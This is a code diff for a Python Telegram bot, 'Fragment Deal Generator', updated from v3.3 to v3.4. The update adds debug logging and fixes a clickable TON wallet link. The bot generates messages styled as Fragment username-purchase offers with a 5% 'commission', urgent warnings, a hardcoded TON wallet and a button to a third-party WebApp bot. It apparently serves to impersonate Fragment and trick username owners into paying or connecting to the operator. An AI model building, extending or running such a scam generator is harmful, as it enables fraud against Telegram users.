@@ -15,7 +15,7 @@ FIXED_CHAT_ID = 511758924
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 
-print(f"🤖 Fragment Deal Generator v3.3 - WEBHOOK FIXED")
+print(f"🤖 Fragment Deal Generator v3.4 - WALLET LINK FIXED")
 print(f"🔑 Token: ✅")
 print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
 print(f"🌐 Port: {PORT}")
@@ -46,7 +46,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         chat_id = update.effective_chat.id
         
-        message = f"""🤖 **Fragment Deal Generator v3.3**
+        message = f"""🤖 **Fragment Deal Generator v3.4**
 
 Hello {user.first_name}! 👋
 
@@ -76,7 +76,7 @@ Hello {user.first_name}! 👋
             pass
 
 async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Commande /create avec formatage en gras"""
+    """Commande /create avec wallet lien corrigé"""
     print(f"📥 CREATE command: {context.args}")
     
     try:
@@ -134,6 +134,12 @@ Important:
         keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
+        # DEBUG: Affichage du message pour debug
+        print("📝 Fragment message:")
+        print(repr(fragment_message))
+        print(f"📏 Message length: {len(fragment_message)}")
+        print(f"💼 Wallet address: '{wallet_address}' (length: {len(wallet_address)})")
+        
         # Création des entités pour le formatage
         entities = []
         
@@ -146,6 +152,7 @@ Important:
                 offset=offer_start,
                 length=len(offer_text)
             ))
+            print(f"✅ Offer Amount: position {offer_start}, length {len(offer_text)}")
         
         # 2. Commission en gras
         commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
@@ -156,6 +163,7 @@ Important:
                 offset=commission_start,
                 length=len(commission_text)
             ))
+            print(f"✅ Commission: position {commission_start}, length {len(commission_text)}")
         
         # 3. Premier point Important en gras
         important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
@@ -166,6 +174,7 @@ Important:
                 offset=important_start1,
                 length=len(important_text1)
             ))
+            print(f"✅ Important 1: position {important_start1}, length {len(important_text1)}")
         
         # 4. Deuxième point Important en gras
         important_text2 = "• If you choose not to proceed, simply ignore this message."
@@ -176,16 +185,35 @@ Important:
                 offset=important_start2,
                 length=len(important_text2)
             ))
+            print(f"✅ Important 2: position {important_start2}, length {len(important_text2)}")
         
-        # 5. Wallet cliquable
+        # 5. Wallet cliquable - CORRECTION ICI
         wallet_start = fragment_message.find(wallet_address)
         if wallet_start != -1:
+            # Vérification debug
+            actual_wallet_text = fragment_message[wallet_start:wallet_start + len(wallet_address)]
+            print(f"🔍 Wallet found at position {wallet_start}")
+            print(f"🔍 Expected wallet: '{wallet_address}'")
+            print(f"🔍 Actual wallet text: '{actual_wallet_text}'")
+            print(f"🔍 Match: {actual_wallet_text == wallet_address}")
+            
             entities.append(MessageEntity(
                 type=MessageEntity.TEXT_LINK,
                 offset=wallet_start,
-                length=len(wallet_address),
+                length=len(wallet_address),  # longueur exacte de l'adresse
                 url=f"https://tonviewer.com/{wallet_address}"
             ))
+            print(f"✅ Wallet link: position {wallet_start}, length {len(wallet_address)}")
+        else:
+            print("❌ Wallet address not found in message!")
+        
+        # DEBUG: Affichage de toutes les entités
+        print("📊 All entities:")
+        for i, entity in enumerate(entities):
+            start = entity.offset
+            end = entity.offset + entity.length
+            text_portion = fragment_message[start:end]
+            print(f"  {i+1}. {entity.type} at {start}-{end}: '{text_portion}'")
         
         # Envoi du message avec toutes les entités
         await update.message.reply_text(
@@ -212,6 +240,8 @@ Important:
         
     except Exception as e:
         print(f"❌ CREATE error: {e}")
+        import traceback
+        traceback.print_exc()
         try:
             await update.message.reply_text(f"❌ Error: {str(e)}")
         except:
@@ -236,7 +266,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • 💎 Real-time TON price
 • 💰 Automatic USD conversion  
 • 🧮 5% commission calculation
-• 🔗 Clickable TON wallet
+• 🔗 Clickable TON wallet (full address)
 • 📱 Integrated WebApp button
 • **Bold formatting** for key information
 
@@ -299,11 +329,12 @@ class WebhookHandler(BaseHTTPRequestHandler):
                      background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
         .status {{ color: #28a745; font-weight: bold; font-size: 18px; }}
         .info {{ background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; }}
+        .wallet {{ font-family: monospace; background: #f8f9fa; padding: 5px; border-radius: 3px; }}
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🤖 Fragment Deal Generator v3.3</h1>
+        <h1>🤖 Fragment Deal Generator v3.4</h1>
         <p class="status">✅ Status: {bot_status}</p>
         <div class="info">
             <p><strong>🔗 Bot:</strong> @BidRequestWebApp_bot</p>
@@ -312,17 +343,18 @@ class WebhookHandler(BaseHTTPRequestHandler):
             <p><strong>🕐 Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
             <p><strong>💎 Target Chat:</strong> {FIXED_CHAT_ID}</p>
             <p><strong>🔄 Event Loop:</strong> {'Active' if event_loop else 'None'}</p>
-            <p><strong>💼 Wallet:</strong> UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR</p>
+            <p><strong>💼 Wallet:</strong><br><span class="wallet">UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR</span></p>
         </div>
         <p><strong>Webhook URL:</strong> {WEBHOOK_URL}/{BOT_TOKEN}</p>
         <p>Ready to generate Fragment deals! 🚀</p>
-        <p><strong>Features v3.3:</strong></p>
+        <p><strong>Features v3.4:</strong></p>
         <ul>
             <li>✅ TON amounts without "TON" text</li>
-            <li>✅ Clickable wallet link (new address)</li>
+            <li>✅ Clickable wallet link (FULL ADDRESS FIXED)</li>
             <li>✅ Correct WebApp button URL (BidRequestWebApp_bot)</li>
             <li>✅ Real-time TON price</li>
             <li>✅ <strong>Bold formatting</strong> for offer amounts and important text</li>
+            <li>🔧 Debug logging for entity positions</li>
         </ul>
     </div>
 </body>
@@ -426,7 +458,7 @@ async def setup_bot():
         print(f"📡 Webhook active: {webhook_info.url}")
         
         bot_status = "RUNNING"
-        print("✅ Bot ready with bold formatting!")
+        print("✅ Bot ready with wallet link FIXED!")
         
         return True
         
@@ -502,7 +534,7 @@ def run_server():
 # ===== MAIN =====
 def main():
     """Point d'entrée principal"""
-    print("🚀 Starting Fragment Deal Generator v3.3...")
+    print("🚀 Starting Fragment Deal Generator v3.4...")
     print("=" * 60)
     
     try:
